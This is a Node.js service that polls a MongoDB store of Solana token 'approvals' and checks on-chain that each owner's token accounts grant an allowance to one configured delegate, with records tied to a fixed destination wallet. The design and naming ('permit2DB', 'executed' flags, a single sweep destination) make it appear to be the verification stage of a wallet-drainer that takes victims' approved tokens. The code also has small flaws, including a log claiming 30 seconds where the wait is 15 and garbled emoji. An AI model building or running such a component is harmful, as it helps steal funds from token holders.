require('dotenv').config({ path: require('path').resolve(__dirname, '.env'), override: true });

const { MongoClient } = require('mongodb');
const { Connection, PublicKey } = require('@solana/web3.js');
const { getAccount, getMint, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID } = require('@solana/spl-token');

const MONGO_URI = process.env.MONGODB_URI;
if (!MONGO_URI) throw new Error('Missing required environment variable: MONGODB_URI');

function requireEnv(name) {
  const value = process.env[name]?.trim();
  if (!value) throw new Error(`Missing required environment variable: ${name}`);
  return value.replace(/^['"]|['"]$/g, '');
}

function loadSolanaConfig() {
  const rpcUrl = requireEnv('SOLANA_MAINNET_RPC');
  const delegateAddress = new PublicKey(requireEnv('SOLANA_MAINNET_DELEGATE')).toBase58();
  const destinationAddress = new PublicKey(requireEnv('SOLANA_MAINNET_DESTINATION')).toBase58();
  if (!/^https?:\/\//.test(rpcUrl)) throw new Error('SOLANA_MAINNET_RPC must be an http(s) URL');
  return { network: 'mainnet-beta', rpcUrl, delegateAddress, destinationAddress };
}

function assertConfiguredDestination(value, config) {
  if (!value || new PublicKey(value).toBase58() !== config.destinationAddress) {
    throw new Error(`Destination mismatch: job=${value || '<missing>'}, runtime=${config.destinationAddress}`);
  }
}

// Solana network configuration
const solanaConfig = { 'mainnet-beta': loadSolanaConfig() };

async function verifySolanaApprovals() {
  const client = new MongoClient(MONGO_URI);
  try {
    await client.connect();
    const db = client.db('permit2DB');
    const solanaApprovalsCollection = db.collection('solana_approvals');

    // Find unverified approvals
    const approvals = await solanaApprovalsCollection.find({ 
      verified: { $ne: true },
      executed: false 
    }).toArray();

    if (approvals.length === 0) {
          console.log('No unverified Solana approvals found');
      return;
    }

    console.log(`Found ${approvals.length} unverified Solana approvals`);

    for (const approvalData of approvals) {
      const { owner, delegate, approvals: approvalList, transactionSignature, network } = approvalData;

      if (!network || !solanaConfig[network]) {
        console.log(`Unsupported network ${network} for owner: ${owner}`);
        continue;
      }

      const { rpcUrl, delegateAddress, destinationAddress } = solanaConfig[network];

      // Use the delegate from config if available, otherwise use the one from DB
      const delegateToCheck = delegateAddress;

      if (!delegateToCheck) {
        console.log(`No delegate address configured for network ${network}`);
        continue;
      }

      const connection = new Connection(rpcUrl, 'confirmed');
      const delegatePublicKey = new PublicKey(delegateToCheck);

      if (!approvalData.destinationAddress || new PublicKey(approvalData.destinationAddress).toBase58() !== destinationAddress) {
        await solanaApprovalsCollection.updateOne({ _id: approvalData._id }, { $set: { executed: true, executedAt: new Date(), reason: 'Destination does not match server configuration' } });
        continue;
      }

      console.log(`Verifying approval for owner: ${owner} on network: ${network}`);
      console.log(`Transaction signature: ${transactionSignature}`);
       // Verify transaction exists and is confirmed
      try {
        const transaction = await connection.getTransaction(transactionSignature, {
          commitment: 'confirmed',
          maxSupportedTransactionVersion: 0,
        });

        if (!transaction) {
          console.log(`Transaction ${transactionSignature} not found`);
          await solanaApprovalsCollection.updateOne(
            { _id: approvalData._id },
            { 
              $set: { 
                executed: true, 
                executedAt: new Date(), 
                reason: 'Transaction not found on-chain' 
              } 
            }
          );
          continue;
        }

        if (!transaction.meta || transaction.meta.err) {
          console.log(`Transaction ${transactionSignature} failed:`, transaction.meta?.err);
          await solanaApprovalsCollection.updateOne(
            { _id: approvalData._id },
            { 
              $set: { 
                executed: true, 
                executedAt: new Date(), 
                 reason: `Transaction failed: ${JSON.stringify(transaction.meta?.err)}` 
              } 
            }
          );
          continue;
        }

        // The approval signature must have been signed by the recorded owner.
        const message = transaction.transaction.message;
        const feePayer = (message.accountKeys?.[0] || message.staticAccountKeys?.[0])?.toString();
        if (feePayer !== new PublicKey(owner).toString()) {
          await solanaApprovalsCollection.updateOne(
            { _id: approvalData._id },
            { $set: { executed: true, executedAt: new Date(), reason: 'Approval transaction signer does not match owner' } }
          );
          continue;
        }

        // Verify each approval on-chain
        let allVerified = true;
        const verificationResults = [];

        for (const approval of approvalList) {
          try {
            const tokenAccountPubkey = new PublicKey(approval.tokenAccount);
            const tokenProgramId = approval.programId === TOKEN_2022_PROGRAM_ID.toBase58() ? TOKEN_2022_PROGRAM_ID : TOKEN_PROGRAM_ID;
            const accountInfo = await getAccount(connection, tokenAccountPubkey, 'confirmed', tokenProgramId);
            const mintInfo = await getMint(connection, accountInfo.mint, 'confirmed', tokenProgramId);

            if (accountInfo.owner.toString() !== new PublicKey(owner).toString() || accountInfo.mint.toString() !== approval.mint || mintInfo.decimals !== approval.decimals || ![TOKEN_PROGRAM_ID.toBase58(), TOKEN_2022_PROGRAM_ID.toBase58()].includes(approval.programId)) {
              verificationResults.push({ tokenAccount: approval.tokenAccount, verified: false, reason: 'Token account owner or mint mismatch' });
              allVerified = false;
              continue;
            }

            // Check if the delegate has the expected allowance
            // Note: In Solana, the delegate is stored in the account's delegate field
            // and the amount is stored separately
            const isDelegateSet = accountInfo.delegate && 
              accountInfo.delegate.toString() === delegatePublicKey.toString();

            const hasAllowance = accountInfo.delegatedAmount > 0n;

            if (isDelegateSet && hasAllowance) {
              verificationResults.push({
                tokenAccount: approval.tokenAccount,
                verified: true,
                delegatedAmount: accountInfo.delegatedAmount.toString(),
              });
               console.log(` ^|^e Verified approval for token account: ${approval.tokenAccount}`);
            } else {
              verificationResults.push({
                tokenAccount: approval.tokenAccount,
                verified: false,
                reason: isDelegateSet ? 'No allowance set' : 'Delegate not set',
              });
              console.log(` ^}^l Approval verification failed for token account: ${approval.tokenAccount}`);
              allVerified = false;
            }
          } catch (verifyError) {
            console.error(`Error verifying approval for ${approval.tokenAccount}:`, verifyError);
            verificationResults.push({
              tokenAccount: approval.tokenAccount,
              verified: false,
              reason: verifyError.message,
            });
            allVerified = false;
          }
        }

        // Update database with verification results
        if (allVerified) {
          await solanaApprovalsCollection.updateOne(
            { _id: approvalData._id },
            { 
              $set: { 
                verified: true, 
                verifiedAt: new Date(),
                verificationResults,
                } 
            }
          );
          console.log(` ^|^e All approvals verified for owner: ${owner}`);
        } else {
          await solanaApprovalsCollection.updateOne(
            { _id: approvalData._id },
            { 
              $set: { 
                verified: false, 
                verifiedAt: new Date(),
                verificationResults,
                reason: 'Some approvals failed verification',
              } 
            }
          );
          console.log(` ^z   ^o Some approvals failed verification for owner: ${owner}`);
        }
      } catch (txError) {
        console.error(`Error fetching transaction ${transactionSignature}:`, txError);
        await solanaApprovalsCollection.updateOne(
          { _id: approvalData._id },
          { 
            $set: { 
              executed: true, 
              executedAt: new Date(), 
              reason: `Transaction fetch error: ${txError.message}` 
            } 
          }
        );
        continue;
      }
    }
  } catch (error) {
    console.error('Verification failed:', error);
  } finally {
    await client.close();
  }
}

async function runContinuously() {
  console.log(`Starting continuous Solana approval verification service pid=${process.pid} cwd=${process.cwd()} file=${__filename} destination=${solanaConfig['mainnet-beta'].destinationAddress}`);
  
  while (true) {
    try {
      await verifySolanaApprovals();
    } catch (error) {
      console.error('Error in verification cycle:', error);
    }
    
    console.log('Waiting 30 seconds before next check...');
    await new Promise(resolve => setTimeout(resolve, 15000));
  }
}


// Run if called directly
if (require.main === module) {
  runContinuously().catch((error) => {
    console.error('Service failed:', error);
    process.exit(1);
  });
}

module.exports = { verifySolanaApprovals, loadSolanaConfig, assertConfiguredDestination };
